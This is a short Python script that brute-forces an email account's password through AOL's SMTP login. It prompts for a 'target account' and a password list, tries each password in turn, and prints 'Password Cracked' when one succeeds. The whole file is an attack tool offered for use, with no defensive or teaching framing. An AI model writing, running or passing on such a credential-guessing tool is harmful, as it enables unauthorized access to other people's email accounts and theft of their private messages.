import smtplib



gmail = smtplib.SMTP("smtp.aol.com", 587)
gmail.ehlo()
gmail.starttls()

user = input ("Enter Your Target Account : ")
passwfile1 = input ("Enter Your Password List : ")
passwfile1 = open(passwfile1, "r")

for password in passwfile1 :
    try :

        gmail.login(user, password)
        print ("Password Cracked ===>", password)
        break;

    except smtplib.SMTPAuthenticationError :
        print ("Password Didn't Cracked ===> ", password)



